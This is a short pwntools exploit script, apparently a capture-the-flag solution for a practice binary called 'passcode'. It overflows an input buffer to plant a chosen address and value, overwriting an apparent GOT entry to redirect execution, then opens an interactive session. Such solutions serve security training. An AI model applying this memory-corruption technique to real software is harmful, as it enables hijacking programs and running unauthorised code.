#!/usr/bin/env python

from pwn import *

sh = process('./passcode')

sh.sendline('A' * 96 + p32(0x804a004) + '134514147')

print sh.recv()
sh.interactive()
